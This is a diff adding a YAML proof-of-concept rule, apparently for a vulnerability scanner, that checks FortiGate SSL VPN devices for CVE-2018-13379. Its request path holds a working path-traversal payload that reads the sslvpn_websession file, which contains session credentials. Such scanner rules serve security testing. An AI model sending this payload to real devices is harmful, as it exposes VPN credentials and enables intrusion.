@@ -1,0 +1,18 @@
+detail:
+  author: tom0li(https://tom0li.github.io/)
+  links:
+  - https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html
+expression: r0()
+manual: true
+name: poc-yaml-fortigate-cve-2018-13379-readfile
+rules:
+  r0:
+    expression: response.body.bcontains(bytes("fgt_lang")) && response.body.bcontains(bytes("Forticlient"))
+    request:
+      cache: true
+      follow_redirects: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: GET
+      path: /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+transport: http
